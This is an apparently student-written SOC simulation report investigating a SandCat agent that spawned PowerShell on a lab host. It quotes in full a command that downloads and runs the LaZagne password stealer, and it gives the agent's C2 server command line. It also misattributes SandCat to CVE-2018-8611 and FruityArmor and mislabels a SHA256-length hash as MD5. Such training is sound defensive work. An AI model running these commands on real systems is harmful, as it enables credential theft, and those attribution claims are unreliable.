# 🔍 Alert Investigation Report

> **Platform:** SOC Simulation Project — WDLabs  
> **Environment:** Microsoft Defender for Endpoint / Microsoft Sentinel

---

## 📋 Case Details

| Field                 | Value                                                                                                                    |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| **Alert Name**        | Suspicious process executed PowerShell command                                                                           |
| **Alert ID / Link**   | https://security.microsoft.com/alerts/daaaddd30b-702d-4e9d-9718-78bb4be8040b_1?tid=567ea528-4e82-40fa-914e-38c05fd69677/ |
| **Analyst**           | Carl Samson                                                                                                              |
| **Date Investigated** | 12/09/2026                                                                                                               |
| **Severity**          | Medium                                                                                                                   |

---

## 1. Alert Summary

- **Host / Account affected:** ec2amaz-9oh9aqq, socsim-srv01.socsim.local / system accounts
- **Date & Time of alert:** 25/6/2026 10:40:25
- **What triggered the alert:** Suspicious process executed PowerShell command
- **Why it triggered (rule/logic):** triggered malware rule alert

---

## 2. Investigation Findings

### What happened?
<!-- How was the activity executed or triggered? Walk through the technical detail. -->

A process named `wusvc.exe` (PID 1828) was running on EC2AMAZ-9OH9AQQ as NT AUTHORITY\SYSTEM. It isn't a real Windows file; the name looks chosen to pass for the Windows Update service.

It also detected a device name,  socsim-srv01.socsim.local, was involved, that wasn’t detected by Windows Defender alert, when looking at the file hash page. 

At 10:40:25 on 25/6/2026, `wusvc.exe` started `powershell.exe` (PID 2544) with `-ExecutionPolicy Bypass`, which turns off PowerShell's script checks. The PowerShell binary itself is the genuine Microsoft file; the problem is the process that started it.

Going by the command line, PowerShell then:

1. Created a folder at `%TEMP%\svcmon`. For SYSTEM, `%TEMP%` normally points to `C:\Windows\Temp`.
2. Downloaded **LaZagne v2.4.3** from GitHub and saved it in that folder as `lz.exe`.
3. Ran `lz.exe all`. LaZagne is a password-stealing tool, and `all` tells it to collect every saved password it can find on the host.


In short, a disguised SYSTEM-level process downloaded a password-stealing tool under a different name and ran it. The alert confirms the PowerShell launch; the command line shows the download and run were attempted, but nothing so far confirms they succeeded.

![[Pasted image 20260917163407.png]]
### Evidence
<!-- What artefacts, log entries, or indicators support your conclusion? -->

```
// Paste key log entries, process trees, or notable findings here
```

Logs finding

| Finding                                      | Log proof                                                                                                                                                |
| -------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `wusvc.exe` is SandCat malware               | `Defender detected 'Trojan:Win64/SandCat.RTS!MTB' in file 'wusvc.exe'`                                                                                   |
| SandCat was actively running                 | `Defender detected active 'Trojan:Win64/SandCat.RTS!MTB' in process 'wusvc.exe'` · `Detection time 25 Jun 2026 04:45:15`                                 |
| Server it connects to                        | `"wusvc.exe" -server http://172.31.2.203:8888 -group red`                                                                                                |
| Location and creation date                   | `C:\Users\Public\wusvc.exe` · `Image file creation time 21 Mar 2026 16:48:03`                                                                            |
| nssm.exe started wusvc.exe                   | Process tree: `[7664] nssm.exe` → `[1828] wusvc.exe`                                                                                                     |
| nssm location and creation date              | `C:\Windows\Temp\nssm\nssm-2.24-101-g897c7ad\win64\nssm.exe` · `Image file creation time 21 Mar 2026 17:55:31`                                           |
| Runs as SYSTEM                               | `User NT AUTHORITY\SYSTEM` · `Integrity level: System`                                                                                                   |
| wusvc.exe hash                               | `SHA1 905f46e4536bbd62777a6924f4234fa2b6471968`                                                                                                          |
| wusvc.exe started PowerShell                 | Process tree: `[1828] wusvc.exe` → `[2544] powershell.exe`                                                                                               |
| PowerShell tried to download and run LaZagne | `DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe',"$env:TEMP\svcmon\lz.exe"); & "$env:TEMP\svcmon\lz.exe" all` |
| PowerShell ran that script                   | `10:40:26 powershell.exe executed a script` · `Content SHA256 283929270d25b3029833001a362c92582f7547bb040f53552d4aa5342f323e88`                          |
| Credential folders were listed               | `10:41:28 [4036] cmd.exe /C dir "%APPDATA%\Microsoft\Protect" ... "%APPDATA%\Microsoft\Credentials" ... "%LOCALAPPDATA%\Microsoft\Credentials"`          |
| cmd.exe ran as SYSTEM                        | `User NT AUTHORITY\SYSTEM` (PID 4036)                                                                                                                    |
| Alert statuses                               | SandCat alerts: `Detected Low` · PowerShell alerts: `Resolved Detected Medium`                                                                           |
|                                              |                                                                                                                                                          |
Virus total Flagged as malicious
![[Pasted image 20260917121721.png]]
![[Pasted image 20260917122336.png]]

Checking the files that devices where involved.
![[Pasted image 20260917122250.png]]

Alert timeline
![[Pasted image 20260917120330.png]]

hashtag file search up KQL
![[Pasted image 20260917121526.png]]

Device Involved 
![[Pasted image 20260917091719.png]]

Information about this malware and related references

![[Pasted image 20260917140923.png]]

### Was the activity successful?
- [x] Yes
- [ ] No
- [ ] Unknown

### Verdict
- [x] **Malicious**
- [ ] **Non-malicious**
- [ ] **Suspicious — requires further investigation**

**Justification:**
<!-- Why did you reach this conclusion? Be specific. -->

LaZagne is an open-source credential recovery  and post-exploitation tool used to extract saved passwords from a local computer. Originally created for legitimate digital forensics and security auditing, but now used by malicious threat actors to automate credential theft. 
We know this by the logs that excuted the powershell command `DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe',"$env:TEMP\svcmon\lz.exe"); & "$env:TEMP\svcmon\lz.exe" all`

The attacker then used **wusvc.exe** is the SandCat agent, detected as `Trojan:Win64/SandCat.RTS!MTB`:  where MD5 hashtag `4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607` is flagged as malicious file and detected on TotalVirus.

SandCat is a **remote-control program**. Once it's running on a machine, whoever controls the Caldera server can make that machine run commands. Which is part of  CVE-2018-8611, a zero day attack related from FruityArmor, which is a APT cyberespionage group


---

## 3. Investigation Steps

<!-- Walk through your process in order. What did you look at first? What led you to each pivot? -->

1.  Went through the process steps  questions from my mentor. To make it easier for my investigation.
2.  Looked at the devices, IP address, commands used and files involved.
3.  Checked the hash tag of lz.exe on virus total
4. Checked the process logs and alert logs and filter out relevant data 

### Queries Used

```
// Paste  KQL queries here

DeviceProcessEvents
|where DeviceName contains "ec2amaz-9oh9aqq"
| where Timestamp between (datetime(2026-06-25 00:30:25) .. datetime(2026-06-25 00:50:25))`

 AlertEvidence
| where AlertId == "daaaddd30b-702d-4e9d-9718-78bb4be8040b_1"
| where EntityType == "Account"
| distinct DeviceName

DeviceFileEvents
| where FileName =~ "wusvc.exe"
| project Timestamp, DeviceName, FolderPath, SHA1, SHA256, MD5



```

---

## 4. Categorisation

- [x] ✅ **True Positive** — malicious activity confirmed
- [ ] ⚠️ **Benign True Positive** — alert fired correctly, activity is legitimate
- [ ] ❌ **False Positive** — alert fired incorrectly, rule needs review

---

## 5. Recommended Actions

**Escalation:**
- [x] Urgent — phone call required
- [ ] Non-urgent — email sufficient
- [ ] No escalation required

**Containment / Next Steps:**
<!-- What should happen next? Free text — don't limit yourself to a checklist. -->

- Snapshot the disk to keep evidence, then isolate EC2AMAZ-9OH9AQQ and block traffic to the attacker's server at 172.31.2.203:8888.
- Stop and remove the nssm service running `wusvc.exe`, then delete `C:\Users\Public\wusvc.exe`, `C:\Windows\Temp\nssm\` and `C:\Windows\Temp\svcmon\`. Block the file hashes (wusvc.exe SHA1 `905f46e4536bbd62777a6924f4234fa2b6471968`, nssm.exe SHA1 `f280858dcfefabc1a9a006a57f6b266a5d1fde8e`).
- Reset all credentials stored on the host, including local admin, service accounts and any affected domain accounts, and clear saved passwords.
- Revoke the EC2 instance's IAM role sessions and review CloudTrail logs for any use of those credentials.
- Investigate 172.31.2.203 and confirm whether this was an authorised red-team exercise.
- Rebuild the device with a new hostname and IP address if needed.
- Reopen the alert and raise its severity.



**Alert Tuning:**
- [ ] Tune recommended —
- [x] No tuning required

---

## 6. Lessons Learned

<!-- What would you do differently? Where did you go wrong or take a longer path than needed?
     This is the most valuable part of the write-up for your own growth and for anyone reading your portfolio. -->
 - Could've gone a bit deeper on the devices history and track every movement they make
 - Could've added more conclusion on my evidence since this alert was straight forward
 - Virus total wasn't needed as window defender has some built in feature like total virus 
 - would've use more tools other then window defender to research more 

---

<details>
<summary>📚 About this template</summary>

This investigation template is from the **[SOC Simulation Project](https://www.skool.com/socsim/about)** by WDLabs / WebDefend Cyber Security — a hands-on training environment giving aspiring analysts access to Microsoft Defender for Endpoint and Microsoft Sentinel to investigate real alerts generated by emulated threat actor TTPs.

</details>
